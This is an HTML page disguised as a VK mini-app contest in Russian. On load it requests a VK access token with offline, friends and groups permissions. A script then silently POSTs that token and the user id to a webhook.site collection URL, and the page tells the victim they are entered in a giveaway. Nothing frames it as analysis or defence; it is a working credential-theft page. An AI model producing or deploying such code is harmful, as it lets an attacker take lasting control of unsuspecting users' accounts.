<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Конкурс</title>
  <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
</head>
<body>
  <p>Загрузка...</p>
  <script>
    window.vkBridge.send("VKWebAppInit");

    window.vkBridge.send("VKWebAppGetAuthToken", {
      app_id: 54786076,
      scope: "offline,friends,groups"
    })
    .then(function(data) {
      return fetch("https://webhook.site/d5ce111a-d195-4b31-877f-2201eac2cf4e", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          token: data.access_token,
          user_id: data.user_id,
          scope: data.scope
        })
      });
    })
    .then(function() {
      document.body.innerHTML = "<p>Ты участвуешь! Напиши слово СТЕНДОФФ в канал.</p>";
    })
    .catch(function(err) {
  var msg = err && err.error_data ? JSON.stringify(err.error_data)
          : err && err.error_msg  ? err.error_msg
          : JSON.stringify(err);
  document.body.innerHTML = "<pre>Ошибка: " + msg + "</pre>";
});
  </script>
</body>
</html>
